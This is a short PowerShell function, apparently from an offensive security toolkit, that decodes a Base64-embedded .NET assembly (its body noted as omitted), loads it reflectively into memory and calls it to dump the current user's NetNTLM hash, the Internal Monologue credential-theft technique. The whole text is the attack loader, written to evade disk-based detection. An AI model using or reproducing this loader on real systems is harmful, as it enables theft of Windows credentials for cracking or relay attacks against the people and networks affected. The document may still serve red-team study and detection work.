$InternalMonologue = $null
Function Get-Hash {
if ($InternalMonologue -ne "TRUE") {
    $script:InternalMonologue = "TRUE"
    echo "Loading Assembly"
    $PS = "TVqQAAMAAAAEAAAA//8AAL...AAAAAAAAAAAAAAA=="# NOTE: The actual 21848-character Base64 string omitted for readability.
    $dllbytes  = [System.Convert]::FromBase64String($PS)
    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
}
$output = [InternalMonologue.Class1]::Main()
Write-Output ("[+] NetNTLM Hash")
Write-Output $output
}
